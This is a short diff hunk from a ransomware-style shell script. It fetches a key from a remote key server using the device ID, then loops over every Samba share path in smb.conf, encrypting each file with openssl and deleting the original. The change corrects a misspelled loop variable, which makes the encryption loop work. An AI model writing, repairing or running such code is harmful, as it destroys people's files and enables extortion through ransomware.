@@ -18,7 +18,7 @@ KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
 smb=True
 if [ $smb == "True" ]
 then
-	for targerFolder in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
+	for targetFolder in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
 	do
 		find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 	done
